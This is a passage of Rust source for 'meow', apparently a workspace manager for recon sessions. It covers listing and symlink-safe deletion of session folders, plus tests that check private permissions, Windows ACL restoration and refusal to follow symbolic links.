    /// Recons with stages still to run. They run only while their session
    /// is open, and end with it.
    pub unfinished_tasks: usize,
    pub last_active: Option<SystemTime>,
    /// The folder's device and number when it was listed (Unix), which
    /// `meow delete` checks before it removes anything.
    pub id: Option<(u64, u64)>,
}

/// Every session: the ones in `./meow` of `cwd`, the ones this user saved
/// in other folders, the ones in `~/.meow/workspaces`, and an old `./.meow`
/// of `cwd`; each once, most recently active first. Read-only: nothing is
/// created or re-permissioned.
pub fn list_workspaces(home: &MeowHome, cwd: &Path) -> Result<Vec<WorkspaceSummary>> {
    let record = read_record(home);
    let mut candidates: Vec<(PathBuf, Option<String>)> = Vec::new();
    let cwd = absolute(cwd)?;
    for (dir, name) in sessions_in(&sessions_dir(&cwd)) {
        candidates.push((dir, Some(name)));
    }
    for entry in record.iter().rev() {
        let Some(dir) = &entry.dir else {
            continue;
        };
        if folder_session(dir).is_some() && profile_mark(dir) == Some(Some(entry.mark.clone())) {
            candidates.push((dir.clone(), None));
        }
    }
    let root = home.workspaces_dir();
    match fs::read_dir(&root) {
        Ok(entries) => {
            for entry in entries {
                let entry = entry.with_context(|| format!("cannot read {}", root.display()))?;
                let name: OsString = entry.file_name();
                let Some(name) = name.to_str().and_then(|n| validate_name(n).ok()) else {
                    continue;
                };
                candidates.push((entry.path(), Some(name)));
            }
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => {}
        Err(e) => return Err(e).with_context(|| format!("cannot read {}", root.display())),
    }
    if let Ok(local) = home.local_dir(&cwd) {
        candidates.push((local, None));
    }
    let mut seen = HashSet::new();
    let mut found = Vec::new();
    for (dir, name) in candidates {
        let key = fs::canonicalize(&dir).unwrap_or_else(|_| dir.clone());
        if !seen.insert(key) {
            continue;
        }
        found.extend(summarize(home, &record, &dir, name));
    }
    found.sort_by(|a, b| {
        b.last_active
            .cmp(&a.last_active)
            .then_with(|| a.name.cmp(&b.name))
    });
    Ok(found)
}

fn summarize(
    home: &MeowHome,
    record: &[Entry],
    dir: &Path,
    name: Option<String>,
) -> Option<WorkspaceSummary> {
    let dir_meta = fs::symlink_metadata(dir).ok()?;
    if !dir_meta.is_dir() {
        return None;
    }
    // Nor through a linked `./meow`: what it leads to is not here.
    if let (Some(_), Some(sessions)) = (folder_session(dir), dir.parent()) {
        if !is_real_sessions_dir(sessions) {
            return None;
        }
    }
    #[cfg(unix)]
    if verify_unix_owner_meta(&dir_meta, dir).is_err() {
        return None;
    }
    let profile_path = dir.join(PROFILE_FILE);
    if !fs::symlink_metadata(&profile_path).is_ok_and(|meta| meta.is_file()) {
        return None;
    }
    let profile = Profile::read(&profile_path).ok();
    let name = name
        .or_else(|| folder_session(dir).map(dir_name))
        .or_else(|| profile.as_ref().and_then(|p| validate_name(&p.name).ok()))
        .unwrap_or_else(|| dir_name(dir));
    let local = !home.is_saved_workspace_dir(dir);
    // A session that came with the folder is listed, but its graph and
    // database are someone else's files: they are not opened for a count.
    let foreign = local && !profile.as_ref().is_some_and(|p| is_own(record, p, dir));
    Some(WorkspaceSummary {
        name,
        dir: dir.to_path_buf(),
        local,
        state: if foreign {
            SessionState::NotYours
        } else {
            SessionState::Closed
        },
        mode: profile.map(|p| p.mode),
        hosts: if foreign {
            0
        } else {
            count_hosts(&dir.join("graph.json"))
        },
        unfinished_tasks: if foreign {
            0
        } else {
            crate::queue::count_unfinished(&dir.join("state.db"))
        },
        last_active: last_active(dir),
        id: held_id(dir),
    })
}

/// The workspace `meow delete` is asked to remove: the one called `name`
/// (found as `meow <name>` finds it), or with `--local` the one in `./meow`
/// or `./.meow` of `cwd`. Only what the listing shows can be deleted: a real
/// directory (never a link to one) that holds a profile.
pub fn find_for_deletion(
    home: &MeowHome,
    cwd: &Path,
    name: Option<&str>,
) -> Result<WorkspaceSummary> {
    let record = read_record(home);
    match name {
        Some(name) => {
            let checked = checked_name(name)?;
            find_session(home, cwd, &checked)?
                .map(|location| location.dir(home, &checked))
                .transpose()?
                .and_then(|dir| summarize(home, &record, &dir, Some(checked)))
                .ok_or_else(|| {
                    anyhow!("There is no workspace named '{name}' (`meow list` shows them)")
                })
        }
        None => {
            let dir = local_session_dir(home, cwd, "`meow delete <name>`")?;
            summarize(home, &record, &dir, None)
                .ok_or_else(|| anyhow!("There is no workspace in {}", dir.display()))
        }
    }
}

/// Fails while a session is open on the workspace, or a helper writes its
/// files ([`Workspace::write_alone`]). Checks the locks read-only so `meow
/// delete` never creates, follows, or truncates a lock file (even inside
/// an unaccepted `./.meow` workspace).
pub fn ensure_closed(workspace: &WorkspaceSummary) -> Result<()> {
    use crate::lock::{LockError, SessionLock};
    let lock = workspace.dir.join(LOCK_FILE);
    if SessionLock::is_held(&lock) {
        let error = LockError::Held {
            pid: crate::lock::holder_pid(&lock),
        };
        bail!(
            "Workspace '{}' is {error}; exit that session first",
            workspace.name
        );
    }
    let helper = workspace.dir.join(HELPER_LOCK_FILE);
    if crate::lock::HelperLock::is_held(&helper) {
        bail!(helper_busy(&helper, &workspace.name));
    }
    Ok(())
}

/// That the helper holding the lock at `path` still writes session `name`.
fn helper_busy(path: &Path, name: &str) -> String {
    let who =
        crate::lock::HelperLock::holder(path).unwrap_or_else(|| "another meow command".to_owned());
    format!("{who} is still writing '{name}': try again when it ends")
}

/// Removes the workspace directory with everything in it: replay log,
/// graph, state, notes, chats and report, and fish's history of it.
/// Refused while a session is open. Its record goes too, and its `./meow`
/// once nothing but the `.gitignore` is left there.
pub fn delete(home: &MeowHome, workspace: &WorkspaceSummary) -> Result<()> {
    check_session_place(&workspace.dir)?;
    // Opened once, never through a link: what is checked and removed below
    // is this folder, whatever `./meow` is swapped for meanwhile, and it
    // must be the one listed.
    #[cfg(unix)]
    let held = {
        let held = HeldDir::open(&workspace.dir)
            .with_context(|| format!("cannot delete {}", workspace.dir.display()))?;
        if workspace.id != Some(held.id) {
            bail!(
                "{} changed since it was listed; nothing was deleted",
                workspace.dir.display()
            );
        }
        held
    };
    if let (Some(_), Some(sessions)) = (folder_session(&workspace.dir), workspace.dir.parent()) {
        // Never through a linked `./meow` to whatever it leads to.
        refuse_symlink(sessions)?;
    }
    refuse_symlink(&workspace.dir)?;
    ensure_closed(workspace)?;
    let mark = profile_mark(&workspace.dir).flatten();
    // fish keeps the session's history in its own folder.
    let fish_history = crate::shims::fish_history_file(&workspace.dir);
    // The lock and the mark above were read from the folder opened.
    #[cfg(unix)]
    held.remove(&workspace.dir)
        .with_context(|| format!("cannot delete {}", workspace.dir.display()))?;
    #[cfg(not(unix))]
    fs::remove_dir_all(&workspace.dir)
        .with_context(|| format!("cannot delete {}", workspace.dir.display()))?;
    if let Some(file) = fish_history {
        let _ = fs::remove_file(file);
    }
    forget(home, &workspace.dir, mark.as_deref())?;
    if let Some(mark) = mark.filter(|mark| is_valid_mark(mark)) {
        // What meow knew of its files, unless another place keeps that mark.
        if !read_record(home).iter().any(|entry| entry.mark == mark) {
            let _ = fs::remove_file(seen_path(home, &mark));
        }
    }
    if let (Some(_), Some(sessions)) = (folder_session(&workspace.dir), workspace.dir.parent()) {
        remove_if_only_marker(sessions);
    }
    Ok(())
}

/// A session folder opened through open folders: the folder that holds it
/// (`./meow`, `~/.meow/workspaces`, or the folder of an old `./.meow`) and
/// the session in it are each opened without following a link, and both
/// must be this user's. Removing it never looks its path up again, so a
/// `./meow` swapped for a link or for another folder cannot send the
/// removal anywhere else.
#[cfg(unix)]
struct HeldDir {
    parent: fs::File,
    name: std::ffi::CString,
    /// The session folder's device and number.
    id: (u64, u64),
}

#[cfg(unix)]
impl HeldDir {
    fn open(dir: &Path) -> io::Result<Self> {
        use std::ffi::CString;
        use std::os::fd::AsRawFd;
        use std::os::unix::ffi::OsStrExt;
        use std::os::unix::fs::MetadataExt;
        let parts = dir
            .parent()
            .and_then(|parent| Some((parent.parent()?, parent.file_name()?, dir.file_name()?)));
        let Some((above, parent, name)) = parts else {
            return Err(io::Error::other("it has no parent folder"));
        };
        // Links above the folder that holds it are the user's own way there.
        let above = fs::canonicalize(above)?;
        let above = open_dir_at(libc::AT_FDCWD, &CString::new(above.as_os_str().as_bytes())?)?;
        let parent = open_dir_at(above.as_raw_fd(), &CString::new(parent.as_bytes())?)?;
        verify_unix_owner_meta(&parent.metadata()?, dir)?;
        let name = CString::new(name.as_bytes())?;
        let found = open_dir_at(parent.as_raw_fd(), &name)?.metadata()?;
        verify_unix_owner_meta(&found, dir)?;
        Ok(Self {
            parent,
            name,
            id: (found.dev(), found.ino()),
        })
    }

    /// Removes the folder with everything in it, relative to the open
    /// folders. `dir` (its path) must still lead to it: what was read by
    /// path meanwhile (the lock, the mark) was read from it.
    fn remove(&self, dir: &Path) -> io::Result<()> {
        use std::os::fd::AsRawFd;
        use std::os::unix::fs::MetadataExt;
        let same = |meta: fs::Metadata| (meta.dev(), meta.ino()) == self.id;
        let found = open_dir_at(self.parent.as_raw_fd(), &self.name)?.metadata()?;
        if !same(found) || !fs::symlink_metadata(dir).is_ok_and(same) {
            return Err(io::Error::other("it was replaced while being deleted"));
        }
        remove_tree_at(self.parent.as_raw_fd(), &self.name, 0)
    }
}

/// The device and number of the session folder `dir`, found as
/// [`HeldDir`] finds it; `None` where that fails.
#[cfg(unix)]
fn held_id(dir: &Path) -> Option<(u64, u64)> {
    HeldDir::open(dir).ok().map(|held| held.id)
}

#[cfg(not(unix))]
fn held_id(_dir: &Path) -> Option<(u64, u64)> {
    None
}

/// Opens the folder `name` in the folder open as `parent`, never through a
/// link and never waiting on a pipe.
#[cfg(unix)]
fn open_dir_at(parent: std::os::fd::RawFd, name: &std::ffi::CStr) -> io::Result<fs::File> {
    use std::os::fd::FromRawFd;
    let flags = libc::O_RDONLY | libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_NONBLOCK;
    // SAFETY: a valid descriptor (or AT_FDCWD) and a valid C string.
    let fd = unsafe { libc::openat(parent, name.as_ptr(), flags | libc::O_CLOEXEC) };
    if fd < 0 {
        return Err(io::Error::last_os_error());
    }
    // SAFETY: `fd` was just opened and is owned by nothing else.
    Ok(unsafe { fs::File::from_raw_fd(fd) })
}

/// The names in the open folder `dir`, without `.` and `..`.
#[cfg(unix)]
fn names_in(dir: &fs::File) -> io::Result<Vec<std::ffi::CString>> {
    use std::os::fd::AsRawFd;
    // SAFETY: duplicates a valid descriptor; the stream below owns the copy.
    let fd = unsafe { libc::fcntl(dir.as_raw_fd(), libc::F_DUPFD_CLOEXEC, 0) };
    if fd < 0 {
        return Err(io::Error::last_os_error());
    }
    // SAFETY: `fd` is a valid descriptor of a folder.
    let stream = unsafe { libc::fdopendir(fd) };
    if stream.is_null() {
        let error = io::Error::last_os_error();
        // SAFETY: `fd` is still ours when `fdopendir` fails.
        unsafe { libc::close(fd) };
        return Err(error);
    }
    let mut names = Vec::new();
    loop {
        // SAFETY: a valid stream; an entry stays valid until the next call.
        let entry = unsafe { libc::readdir(stream) };
        if entry.is_null() {
            break;
        }
        // SAFETY: `d_name` is NUL-terminated.
        let name = unsafe { std::ffi::CStr::from_ptr((*entry).d_name.as_ptr()) };
        if name.to_bytes() != b"." && name.to_bytes() != b".." {
            names.push(name.to_owned());
        }
    }
    // SAFETY: closes the stream and the copied descriptor, once.
    unsafe { libc::closedir(stream) };
    Ok(names)
}

/// How deep `meow delete` follows folders inside a session.
#[cfg(unix)]
const MAX_DELETE_DEPTH: usize = 256;

/// Removes `name` from the folder open as `parent`: a folder with everything
/// in it, anything else (a link included) by itself.
#[cfg(unix)]
fn remove_tree_at(
    parent: std::os::fd::RawFd,
    name: &std::ffi::CStr,
    depth: usize,
) -> io::Result<()> {
    use std::os::fd::AsRawFd;
    let gone = |result: libc::c_int| -> io::Result<()> {
        if result == 0 {
            return Ok(());
        }
        let error = io::Error::last_os_error();
        match error.kind() {
            io::ErrorKind::NotFound => Ok(()),
            _ => Err(error),
        }
    };
    let dir = match open_dir_at(parent, name) {
        Ok(dir) => dir,
        Err(error) if matches!(error.raw_os_error(), Some(libc::ENOTDIR | libc::ELOOP)) => {
            // SAFETY: a valid descriptor and C string.
            return gone(unsafe { libc::unlinkat(parent, name.as_ptr(), 0) });
        }
        Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(()),
        Err(error) => return Err(error),
    };
    if depth > MAX_DELETE_DEPTH {
        return Err(io::Error::other("it is nested too deeply"));
    }
    for entry in names_in(&dir)? {
        remove_tree_at(dir.as_raw_fd(), &entry, depth + 1)?;
    }
    drop(dir);
    // SAFETY: a valid descriptor and C string.
    gone(unsafe { libc::unlinkat(parent, name.as_ptr(), libc::AT_REMOVEDIR) })
}

/// Number of hosts in a `graph.json`, read without validating the rest.
fn count_hosts(graph: &Path) -> usize {
    read_bounded(graph, crate::graph::MAX_GRAPH_BYTES)
        .ok()
        .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
        .and_then(|json| {
            json.get("hosts")
                .and_then(|h| h.as_object())
                .map(|h| h.len())
        })
        .unwrap_or(0)
}

/// Newest modification time among the directory and its top-level entries
/// (`replay.sh` and `profile.toml` change as the session is used).
fn last_active(dir: &Path) -> Option<SystemTime> {
    let own = fs::symlink_metadata(dir)
        .and_then(|meta| meta.modified())
        .ok();
    let children = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .take(256)
        .filter_map(|entry| entry.metadata().and_then(|meta| meta.modified()).ok());
    own.into_iter().chain(children).max()
}

fn format_age(age: Duration) -> String {
    let secs = age.as_secs();
    match secs {
        0..60 => "just now".to_owned(),
        60..3600 => format!("{}m ago", secs / 60),
        3600..86_400 => format!("{}h ago", secs / 3600),
        _ => format!("{}d ago", secs / 86_400),
    }
}

/// `dir` for the listing: the home folder shortened to `~`, as plain text.
pub(crate) fn shown_place(dir: &Path, user_home: Option<&Path>) -> String {
    let text = match user_home.and_then(|home| dir.strip_prefix(home).ok()) {
        Some(rest) if rest.as_os_str().is_empty() => "~".to_owned(),
        Some(rest) => format!("~{}{}", std::path::MAIN_SEPARATOR, rest.display()),
        None => dir.display().to_string(),
    };
    crate::evidence::sanitize(&text, 300)
}

/// Renders the listing printed by `meow list` and by a bare `meow`.
pub fn format_listing(workspaces: &[WorkspaceSummary], now: SystemTime) -> String {
    format_listing_with_home(workspaces, now, dirs::home_dir().as_deref())
}

fn format_listing_with_home(
    workspaces: &[WorkspaceSummary],
    now: SystemTime,
    user_home: Option<&Path>,
) -> String {
    if workspaces.is_empty() {
        return "No workspaces yet. Start one with `meow <name>`.\n".to_owned();
    }
    let header = [
        "NAME",
        "STATE",
        "MODE",
        "HOSTS",
        "TASKS",
        "LAST ACTIVE",
        "WHERE",
    ]
    .map(str::to_owned);
    let mut rows = vec![header];
    for w in workspaces {
        let name = w.name.clone();
        let age = w
            .last_active
            .map(|at| format_age(now.duration_since(at).unwrap_or_default()))
            .unwrap_or_else(|| "unknown".to_owned());
        // Only an open session has work under way: what a closed one left
        // is dropped when it opens.
        let open = matches!(w.state, SessionState::Running | SessionState::Current);
        let tasks = match w.unfinished_tasks {
            n if open && n > 0 => format!("{n} unfinished"),
            _ => "-".to_owned(),
        };
        rows.push([
            name,
            w.state.label().to_owned(),
            w.mode.map_or("?", Mode::as_str).to_owned(),
            w.hosts.to_string(),
            tasks,
            age,
            shown_place(&w.dir, user_home),
        ]);
    }
    let last = rows[0].len() - 1;
    let widths: Vec<usize> = (0..last)
        .map(|col| rows.iter().map(|row| row[col].len()).max().unwrap_or(0))
        .collect();
    let mut out = String::new();
    for row in &rows {
        for (col, width) in widths.iter().enumerate() {
            out.push_str(&format!("{:<width$}  ", row[col]));
        }
        out.push_str(&row[last]);
        out.push('\n');
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Fixture {
        _tmp: tempfile::TempDir,
        home: MeowHome,
        cwd: PathBuf,
    }

    fn fixture() -> Fixture {
        let tmp = tempfile::tempdir().unwrap();
        let home = MeowHome::at(tmp.path().join("home").join(".meow")).unwrap();
        let cwd = tmp.path().join("project");
        fs::create_dir_all(&cwd).unwrap();
        Fixture {
            _tmp: tmp,
            home,
            cwd,
        }
    }

    fn open(fx: &Fixture, name: &str, local: bool) -> (Workspace, bool) {
        Workspace::open_or_create(&fx.home, &fx.cwd, name, local, Mode::Light).unwrap()
    }

    /// The marks the record holds, oldest first.
    fn marks(home: &MeowHome) -> Vec<String> {
        read_record(home)
            .into_iter()
            .map(|entry| entry.mark)
            .collect()
    }

    #[cfg(unix)]
    fn mode_of(path: &Path) -> u32 {
        use std::os::unix::fs::PermissionsExt;
        fs::metadata(path).unwrap().permissions().mode() & 0o7777
    }

    #[cfg(unix)]
    fn chmod(path: &Path, mode: u32) {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).unwrap();
    }

    /// Owner and access list of a file or folder, every account as a SID so
    /// the checks hold whatever the system language.
    #[cfg(windows)]
    struct AclListing {
        owner: String,
        /// True when the list does not inherit from the parent folder.
        protected: bool,
        /// Each entry's SID and whether it was inherited.
        entries: Vec<(String, bool)>,
    }

    /// Reads `path`'s access list with the same System32 PowerShell the
    /// module uses. The path goes in by environment, never into the script.
    #[cfg(windows)]
    fn acl_listing(path: &Path) -> AclListing {
        const SCRIPT: &str = r#"
$ErrorActionPreference = 'Stop'
$item = Get-Item -LiteralPath $env:MEOW_TEST_ACL_PATH -Force
$sid = [System.Security.Principal.SecurityIdentifier]
$acl = $item.GetAccessControl()
Write-Output ('owner ' + $acl.GetOwner($sid).Value)
Write-Output ('protected ' + $acl.AreAccessRulesProtected)
foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
    Write-Output ('entry ' + $rule.IdentityReference.Value + ' ' + $rule.IsInherited)
}
"#;
        let out = std::process::Command::new(windows_powershell_exe().unwrap())
            .args([
                "-NoLogo",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                SCRIPT,
            ])
            .env("MEOW_TEST_ACL_PATH", path)
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "cannot read the access list of {}: {}",
            path.display(),
            String::from_utf8_lossy(&out.stderr)
        );
        let mut listing = AclListing {
            owner: String::new(),
            protected: false,
            entries: Vec::new(),
        };
        for line in String::from_utf8_lossy(&out.stdout).lines().map(str::trim) {
            if let Some(owner) = line.strip_prefix("owner ") {
                listing.owner = owner.to_owned();
            } else if let Some(flag) = line.strip_prefix("protected ") {
                listing.protected = flag.eq_ignore_ascii_case("true");
            } else if let Some(entry) = line.strip_prefix("entry ") {
                let (sid, inherited) = entry
                    .rsplit_once(' ')
                    .unwrap_or_else(|| panic!("unexpected access entry {entry:?}"));
                listing
                    .entries
                    .push((sid.to_owned(), inherited.eq_ignore_ascii_case("true")));
            }
        }
        assert!(
            is_valid_windows_sid(&listing.owner),
            "no owner read for {}",
            path.display()
        );
        listing
    }

    #[cfg(windows)]
    fn icacls(path: &Path, args: &[&str]) -> std::process::Output {
        std::process::Command::new(windows_system32_exe("icacls").unwrap())
            .arg(path)
            .args(args)
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap()
    }

    #[cfg(windows)]
    fn icacls_ok(path: &Path, args: &[&str]) {
        let out = icacls(path, args);
        assert!(
            out.status.success(),
            "icacls {} {args:?} failed: {} {}",
            path.display(),
            String::from_utf8_lossy(&out.stdout).trim(),
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }

    #[test]
    fn workspace_names_are_single_safe_directory_names() {
        for good in ["a", "acme-lab", "client_2026.q4", "HTB.box-01", "7days"] {
            assert_eq!(validate_name(good).as_deref(), Ok(good));
        }
        let too_long = "a".repeat(65);
        for bad in [
            "",
            ".",
            "..",
            ".hidden",
            "-flag",
            "a/b",
            "a\\b",
            "a b",
            "caf\u{e9}",
            "trailing.",
            "nul",
            "CON",
            "com1.txt",
            "~",
            "a:b",
            too_long.as_str(),
        ] {
            assert!(validate_name(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn create_then_resume_keeps_the_profile() {
        let fx = fixture();
        let (mut ws, created) = open(&fx, "acme", false);
        assert!(created);
        assert_eq!(ws.dir, fx.home.workspace_dir("acme"));
        assert!(ws.dir.is_absolute() && !ws.local);
        assert!(ws.tmp_dir().is_dir() && ws.chats_dir().is_dir());
        assert_eq!(
            ws.profile,
            Profile {
                name: "acme".into(),
                mode: Mode::Light,
                recon: PresetOverride::default(),
                id: None,
            }
        );

        ws.set_mode(Mode::Aggressive).unwrap();
        let (again, created) =
            Workspace::open_or_create(&fx.home, &fx.cwd, "acme", false, Mode::Mild).unwrap();
        assert!(!created);
        assert_eq!(again.profile.mode, Mode::Aggressive);
        assert_eq!(Workspace::load(&ws.dir).unwrap(), again);
    }

    #[test]
    fn new_workspaces_take_the_configured_default_mode() {
        let fx = fixture();
        let (ws, _) =
            Workspace::open_or_create(&fx.home, &fx.cwd, "acme", false, Mode::Mild).unwrap();
        assert_eq!(ws.profile.mode, Mode::Mild);
    }

    #[cfg(unix)]
    #[test]
    fn everything_is_created_private() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        for dir in [
            fx.home.root().to_path_buf(),
            fx.home.workspaces_dir(),
            ws.dir.clone(),
            ws.tmp_dir(),
            ws.chats_dir(),
        ] {
            assert_eq!(mode_of(&dir), 0o700, "{}", dir.display());
        }
        assert_eq!(mode_of(&ws.profile_path()), 0o600);

        Config::load_or_create(&fx.home).unwrap();
        assert_eq!(mode_of(&fx.home.config_path()), 0o600);

        let file = ws.replay_path();
        private_open_options()
            .append(true)
            .create(true)
            .open(&file)
            .unwrap();
        assert_eq!(mode_of(&file), 0o600);
    }

    #[cfg(unix)]
    #[test]
    fn loosened_permissions_are_reapplied_on_open_and_load() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        let nested = ws.tmp_dir().join("shell");
        fs::create_dir(&nested).unwrap();
        let stray = nested.join("bashrc");
        fs::write(&stray, "x").unwrap();

        let loosen = || {
            chmod(&ws.dir, 0o755);
            chmod(&nested, 0o777);
            chmod(&stray, 0o644);
            chmod(&ws.profile_path(), 0o664);
        };
        let assert_private = || {
            assert_eq!(mode_of(&ws.dir), 0o700);
            assert_eq!(mode_of(&nested), 0o700);
            assert_eq!(mode_of(&stray), 0o600);
            assert_eq!(mode_of(&ws.profile_path()), 0o600);
        };

        loosen();
        open(&fx, "acme", false);
        assert_private();

        loosen();
        Workspace::load(&ws.dir).unwrap();
        assert_private();
    }

    /// ISS-032 on a real NTFS folder: a workspace opened up to Everyone is
    /// taken back to the user, SYSTEM and Administrators when it is opened
    /// again, and a folder owned by another account is refused.
    #[cfg(windows)]
    #[test]
    fn windows_reopen_takes_back_access_and_refuses_other_owners() {
        const EVERYONE: &str = "S-1-1-0";
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        let nested = ws.tmp_dir().join("shell");
        fs::create_dir(&nested).unwrap();
        let stray = nested.join("bashrc");
        fs::write(&stray, "x").unwrap();

        // Everyone in every way a folder can carry it: the root inherits
        // again and holds an inheritable entry, which also reaches the
        // children; the subfolder stops inheriting and keeps its own copy;
        // the files get entries of their own. The SID form works in any
        // system language, where the account name would not.
        icacls_ok(&ws.dir, &["/inheritance:e"]);
        icacls_ok(&ws.dir, &["/grant", "*S-1-1-0:(OI)(CI)(F)"]);
        icacls_ok(&nested, &["/inheritance:d"]);
        icacls_ok(&nested, &["/grant", "*S-1-1-0:(OI)(CI)(M)"]);
        icacls_ok(&stray, &["/grant", "*S-1-1-0:(R)"]);
        icacls_ok(&ws.profile_path(), &["/grant", "*S-1-1-0:(R)"]);
        for path in [&ws.dir, &nested, &stray, &ws.profile_path()] {
            let listing = acl_listing(path);
            assert!(
                listing.entries.iter().any(|(sid, _)| sid == EVERYONE),
                "the setup did not open {} to Everyone",
                path.display()
            );
        }
        assert!(!acl_listing(&ws.dir).protected);
        assert!(acl_listing(&nested).protected);

        // Opening an existing workspace is what re-applies the access lists.
        let (again, created) = open(&fx, "acme", false);
        assert!(!created);
        assert_eq!(again.dir, ws.dir);

        let id = current_windows_identity().unwrap();
        let trusted = [id.user.as_str(), "S-1-5-18", "S-1-5-32-544"];
        let check = |path: &Path, root: bool| {
            let listing = acl_listing(path);
            assert_eq!(
                listing.protected,
                root,
                "{}: only the workspace folder may stop inheriting",
                path.display()
            );
            assert!(
                !listing.entries.is_empty(),
                "{} has no entries",
                path.display()
            );
            for (sid, inherited) in &listing.entries {
                assert_ne!(sid, EVERYONE, "{} still lets Everyone in", path.display());
                assert!(
                    trusted.iter().any(|t| t.eq_ignore_ascii_case(sid)),
                    "{} lets {sid} in",
                    path.display()
                );
                assert_eq!(
                    *inherited,
                    !root,
                    "{}: {sid} should be {}",
                    path.display(),
                    if root { "explicit" } else { "inherited" }
                );
            }
        };
        check(&ws.dir, true);
        for path in [
            ws.tmp_dir(),
            ws.chats_dir(),
            nested,
            stray,
            ws.profile_path(),
        ] {
            check(&path, false);
        }

        // Giving a folder to another account takes the restore privilege,
        // which the elevated administrator on a GitHub runner holds, so it
        // must work there; on a desktop without it this half is skipped.
        let other = fx.home.workspace_dir("other");
        fs::create_dir(&other).unwrap();
        let setowner = icacls(&other, &["/setowner", "*S-1-5-19"]);
        if !setowner.status.success() {
            let why = format!(
                "icacls /setowner failed: {} {}",
                String::from_utf8_lossy(&setowner.stdout).trim(),
                String::from_utf8_lossy(&setowner.stderr).trim()
            );
            assert!(env::var_os("GITHUB_ACTIONS").is_none(), "{why}");
            eprintln!("skipping the other-owner check: {why}");
            return;
        }
        assert_eq!(acl_listing(&other).owner, "S-1-5-19");
        let err = Workspace::open_or_create(&fx.home, &fx.cwd, "other", false, Mode::Light)
            .expect_err("a folder owned by LOCAL SERVICE was taken into use");
        let kind = err
            .chain()
            .find_map(|cause| cause.downcast_ref::<io::Error>())
            .map(io::Error::kind);
        assert_eq!(kind, Some(io::ErrorKind::PermissionDenied), "{err:#}");
        assert!(
            format!("{err:#}").contains("belongs to another Windows account"),
            "{err:#}"
        );
        assert!(!other.join(PROFILE_FILE).exists());
        assert!(!other.join("tmp").exists());
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_are_neither_used_nor_followed() {
        let fx = fixture();
        let outside = fx.cwd.join("outside");
        fs::create_dir(&outside).unwrap();
        let secret = outside.join("key");
        fs::write(&secret, "k").unwrap();
        chmod(&secret, 0o644);

        // A symlinked workspace root is refused outright: an old `./.meow`,
        // a `./meow`, or a session folder inside it.
        std::os::unix::fs::symlink(&outside, fx.cwd.join(".meow")).unwrap();
        let legacy = Location::Legacy(fx.cwd.clone());
        let err = Workspace::open_at(&fx.home, &legacy, "x", Mode::Light).unwrap_err();
        assert!(err.to_string().contains("symbolic link"), "{err:#}");
        assert!(Workspace::load(&fx.cwd.join(".meow")).is_err());
        fs::create_dir(outside.join("x")).unwrap();
        fs::write(outside.join("x").join(PROFILE_FILE), "name = \"x\"\n").unwrap();
        std::os::unix::fs::symlink(&outside, fx.cwd.join("meow")).unwrap();
        let folder = Location::Folder(fx.cwd.clone());
        // Never looked up, listed or deleted through: what it leads to is
        // not here.
        assert_eq!(find_session(&fx.home, &fx.cwd, "x").unwrap(), None);
        assert!(list_workspaces(&fx.home, &fx.cwd).unwrap().is_empty());
        assert!(find_for_deletion(&fx.home, &fx.cwd, Some("x")).is_err());
        let err = Workspace::open_at(&fx.home, &folder, "x", Mode::Light).unwrap_err();
        assert!(err.to_string().contains("symbolic link"), "{err:#}");
        assert!(Workspace::load(&fx.cwd.join("meow").join("x")).is_err());
        let err = Workspace::open_or_create(&fx.home, &fx.cwd, "y", true, Mode::Light).unwrap_err();
        assert!(err.to_string().contains("is a link"), "{err:#}");
        fs::remove_file(fx.cwd.join("meow")).unwrap();
        fs::remove_dir_all(outside.join("x")).unwrap();
        fs::create_dir_all(fx.cwd.join("meow")).unwrap();
        std::os::unix::fs::symlink(&outside, fx.cwd.join("meow").join("z")).unwrap();
        let err = Workspace::open_at(&fx.home, &folder, "z", Mode::Light).unwrap_err();
        assert!(err.to_string().contains("symbolic link"), "{err:#}");
        fs::remove_dir_all(fx.cwd.join("meow")).unwrap();

        // A link anywhere inside a workspace is refused, never followed:
        // nothing outside is chmod-ed, written, truncated or removed.
        let (ws, _) = open(&fx, "acme", false);
        chmod(&outside, 0o755);
        fs::write(outside.join(".zshrc"), "mine").unwrap();
        let inside = |name: &str| ws.dir.join(name);
        for (link, target) in [
            (ws.tmp_dir().join("link"), &outside),
            (inside("keylink"), &secret),
            (inside("session.lock"), &secret),
            (inside("replay.sh"), &secret),
            (inside("last_cwd"), &secret),
            (inside("state.db"), &secret),
            (inside("graph.json"), &secret),
        ] {
            std::os::unix::fs::symlink(target, &link).unwrap();
            let err = Workspace::load(&ws.dir).unwrap_err();
            assert!(
                format!("{err:#}").contains("symbolic link"),
                "{link:?}: {err:#}"
            );
            let err = Workspace::open_or_create(&fx.home, &fx.cwd, "acme", false, Mode::Light)
                .unwrap_err();
            assert!(
                format!("{err:#}").contains("symbolic link"),
                "{link:?}: {err:#}"
            );
            fs::remove_file(&link).unwrap();
        }
        // The folders meow creates itself, replaced by links to a folder
        // that holds the user's own shell start-up file.
        for dir in ["chats", "tmp"] {
            fs::remove_dir_all(inside(dir)).unwrap();
            std::os::unix::fs::symlink(&outside, inside(dir)).unwrap();
            assert!(Workspace::load(&ws.dir).is_err(), "{dir}");
            assert!(
                Workspace::open_or_create(&fx.home, &fx.cwd, "acme", false, Mode::Light).is_err(),
                "{dir}"
            );
            assert!(create_private_subdir(&inside(dir)).is_err(), "{dir}");
            fs::remove_file(inside(dir)).unwrap();
        }
        assert_eq!(mode_of(&outside), 0o755);
        assert_eq!(mode_of(&secret), 0o644);
        assert_eq!(fs::read_to_string(&secret).unwrap(), "k");
